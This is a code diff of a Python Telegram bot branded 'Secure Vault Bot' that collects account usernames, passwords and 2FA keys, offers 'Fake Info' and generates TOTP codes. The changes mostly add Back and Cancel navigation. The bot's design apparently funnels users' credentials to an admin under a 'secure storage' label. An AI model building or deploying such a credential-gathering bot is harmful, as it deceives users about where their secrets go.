@@ -8,7 +8,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 # ========= CONFIG =========
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_USERNAME = "@Sefuax"
+ADMIN_USERNAME = "@ZynexNox"  # ← এটা সবাই দেখতে পাবে
 
 # Conversation states for Submit Account
 USERNAME, PASSWORD, TFA = range(3)
@@ -20,7 +20,8 @@ main_keyboard = ReplyKeyboardMarkup(
     [
         [KeyboardButton("✅ Submit Account"), KeyboardButton("🎭 Fake Info")],
         [KeyboardButton("👤 Admin")],
-        [KeyboardButton("🔐2FA"), KeyboardButton("📥 Download")]
+        [KeyboardButton("🔐2FA"), KeyboardButton("📥 Download")],
+        [KeyboardButton("🔙 Back")]  # ← সব কনভারসেশন বন্ধের বাটন
     ],
     resize_keyboard=True
 )
@@ -86,6 +87,10 @@ async def send_to_admin(app, message_text, file_path=None, user_id=None):
 
 # ========= HANDLERS =========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # কোনো চলমান কনভারসেশন থাকলে সেটা বন্ধ করুন
+    if context.user_data.get(ConversationHandler.KEY) is not None:
+        await update.message.reply_text("🔄 Previous action cancelled. Returning to main menu.")
+    context.user_data.clear()
     welcome_msg = (
         "🤖 *Welcome to Secure Vault Bot* 🤖\n\n"
         "I help you store and manage your account credentials.\n\n"
@@ -97,20 +102,30 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🚀 *Start by submitting your first account!*"
     )
     await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard)
+    return ConversationHandler.END  # সব কনভারসেশন শেষ
 
-# --- Submit Account Conversation (unchanged) ---
+async def back_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """হ্যান্ডেল '🔙 Back' বাটন – সব কনভারসেশন বন্ধ করে মেনু দেখায়"""
+    if context.user_data.get(ConversationHandler.KEY) is not None:
+        await update.message.reply_text("🔁 Action cancelled. Back to main menu.", reply_markup=main_keyboard)
+        context.user_data.clear()
+    else:
+        await update.message.reply_text("🏠 You are already on main menu.", reply_markup=main_keyboard)
+    return ConversationHandler.END
+
+# --- Submit Account Conversation ---
 async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🔐 *Submit Account*\n\nPlease send your *Username*:", parse_mode="Markdown")
+    await update.message.reply_text("🔐 *Submit Account*\n\nPlease send your *Username* (or type /cancel):", parse_mode="Markdown")
     return USERNAME
 
 async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['username'] = update.message.text
-    await update.message.reply_text("🔑 Now send your *Password*:", parse_mode="Markdown")
+    await update.message.reply_text("🔑 Now send your *Password* (or type /cancel):", parse_mode="Markdown")
     return PASSWORD
 
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['password'] = update.message.text
-    await update.message.reply_text("🔢 Send *2FA Key* (or type 'none' to skip):", parse_mode="Markdown")
+    await update.message.reply_text("🔢 Send *2FA Key* (or type 'none' to skip, or /cancel):", parse_mode="Markdown")
     return TFA
 
 async def get_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -149,7 +164,7 @@ async def fake_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(fake_msg, parse_mode="Markdown", reply_markup=main_keyboard)
 
-# --- Admin Contact ---
+# --- Admin Contact (সবার জন্য দৃশ্যমান)---
 async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     msg = (
@@ -165,55 +180,71 @@ async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id=user.id
     )
 
-# --- 2FA Generator (TOTP) ---
+# --- 2FA Generator (TOTP) with Cancel inline button ---
 async def twofa_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Ask user for the 2FA secret key"""
+    # ইনলাইন ক্যান্সেল বাটন
+    cancel_inline = InlineKeyboardMarkup([
+        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_2fa_inline")]
+    ])
     await update.message.reply_text(
         "🔐 *Two-Factor Authentication (TOTP)*\n\n"
-        "Please send your **2FA secret key** (Base32 format, e.g., `JBSWY3DPEHPK3PXP`).\n\n"
-        "Type `/cancel` to abort.",
-        parse_mode="Markdown"
+        "Please send your **2FA secret key** (Base32 format, e.g., `JBSWY3DPEHPK3PXP`).\n"
+        "Type `/cancel` or press 'Cancel' button to exit.\n\n"
+        "🔹 *নোট:* সিক্রেট কী কোথাও সেভ হবে না।",
+        parse_mode="Markdown",
+        reply_markup=cancel_inline
     )
     return WAITING_2FA_SECRET
 
 async def generate_totp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Generate TOTP code from the provided secret"""
     secret = update.message.text.strip()
     if not secret:
-        await update.message.reply_text("❌ Invalid secret. Please send a non-empty key.")
+        await update.message.reply_text("❌ Empty secret. Please send a valid Base32 key or type /cancel.")
         return WAITING_2FA_SECRET
     try:
-        # Try to create TOTP object. If secret is invalid, it will raise an exception later.
         totp = pyotp.TOTP(secret)
         current_code = totp.now()
         await update.message.reply_text(
             f"🔐 *Your 6-digit code:* `{current_code}`\n\n"
             f"✅ Code generated successfully!\n"
-            f"🤖 Bot is restarting session... (Your data is not saved)",
+            f"🤖 Returning to main menu.",
             parse_mode="Markdown",
             reply_markup=main_keyboard
         )
-        # Clear user data (nothing saved) – simulate "restart"
-        if 'twofa_secret' in context.user_data:
-            del context.user_data['twofa_secret']
+        # সেশন রিসেট
+        context.user_data.clear()
+        return ConversationHandler.END
     except Exception as e:
+        # ভুল কী দিলে ক্যান্সেল অপশনসহ বার্তা
+        cancel_inline = InlineKeyboardMarkup([
+            [InlineKeyboardButton("❌ Cancel", callback_data="cancel_2fa_inline")]
+        ])
         await update.message.reply_text(
-            f"❌ Invalid Base32 secret key.\nError: {str(e)}\n\nPlease send a valid secret key (e.g., from Google Authenticator).",
-            parse_mode="Markdown"
+            f"❌ *Invalid Base32 secret key.*\nError: {str(e)}\n\nPlease send a valid secret key.\nPress Cancel to go back.",
+            parse_mode="Markdown",
+            reply_markup=cancel_inline
         )
-        return WAITING_2FA_SECRET
-    # End conversation (restart effect)
+        return WAITING_2FA_SECRET  # এখনো কনভারসেশনে থাকবে
+
+async def inline_cancel_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.message.edit_text("❌ 2FA generation cancelled. Back to main menu.")
+    await query.message.reply_text("🏠 Main menu:", reply_markup=main_keyboard)
+    context.user_data.clear()
     return ConversationHandler.END
 
 async def cancel_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ 2FA generation cancelled.", reply_markup=main_keyboard)
+    context.user_data.clear()
     return ConversationHandler.END
 
-# --- Download & Reset (unchanged) ---
+# --- Download & Reset (unchanged but with back support)---
 async def download_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("📎 Download", callback_data="download_file")],
-        [InlineKeyboardButton("🔄 Reset Report", callback_data="reset_report")]
+        [InlineKeyboardButton("🔄 Reset Report", callback_data="reset_report")],
+        [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
     ])
     await update.message.reply_text(
         "📁 *Account Management*\n\nChoose an option:",
@@ -285,10 +316,20 @@ async def handle_download_callback(update: Update, context: ContextTypes.DEFAULT
     
     elif query.data == "cancel_reset":
         await query.edit_message_text("✅ *Reset cancelled.* Your data is safe.", parse_mode="Markdown")
+    
+    elif query.data == "back_to_menu":
+        await query.edit_message_text("🔙 Returning to main menu.")
+        await query.message.reply_text("🏠 Main menu:", reply_markup=main_keyboard)
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Cancelled. Use /start to begin again.", reply_markup=main_keyboard)
-    return ConversationHandler.END
+async def cancel_global(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """হ্যান্ডেল /cancel কমান্ড"""
+    if context.user_data.get(ConversationHandler.KEY) is not None:
+        await update.message.reply_text("❌ Action cancelled.", reply_markup=main_keyboard)
+        context.user_data.clear()
+        return ConversationHandler.END
+    else:
+        await update.message.reply_text("No active action to cancel.", reply_markup=main_keyboard)
+        return ConversationHandler.END
 
 # ========= MAIN =========
 def main():
@@ -306,7 +347,7 @@ def main():
             PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
             TFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tfa)],
         },
-        fallbacks=[CommandHandler("cancel", cancel)],
+        fallbacks=[CommandHandler("cancel", cancel_global), MessageHandler(filters.Regex("^🔙 Back$"), back_button)],
     )
     
     # Conversation: 2FA Generator
@@ -315,18 +356,21 @@ def main():
         states={
             WAITING_2FA_SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_totp)],
         },
-        fallbacks=[CommandHandler("cancel", cancel_2fa)],
+        fallbacks=[CommandHandler("cancel", cancel_global), MessageHandler(filters.Regex("^🔙 Back$"), back_button)],
     )
     
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("cancel", cancel_global))
     app.add_handler(submit_conv)
     app.add_handler(twofa_conv)
     app.add_handler(MessageHandler(filters.Regex("^🎭 Fake Info$"), fake_info))
     app.add_handler(MessageHandler(filters.Regex("^👤 Admin$"), admin_contact))
     app.add_handler(MessageHandler(filters.Regex("^📥 Download$"), download_menu))
-    app.add_handler(CallbackQueryHandler(handle_download_callback))
+    app.add_handler(MessageHandler(filters.Regex("^🔙 Back$"), back_button))
+    app.add_handler(CallbackQueryHandler(handle_download_callback, pattern="^(download_file|reset_report|confirm_reset|cancel_reset|back_to_menu)$"))
+    app.add_handler(CallbackQueryHandler(inline_cancel_2fa, pattern="^cancel_2fa_inline$"))
     
-    print("🤖 Bot is starting...")
+    print("🤖 Bot is starting... (with Back/Cancel everywhere)")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
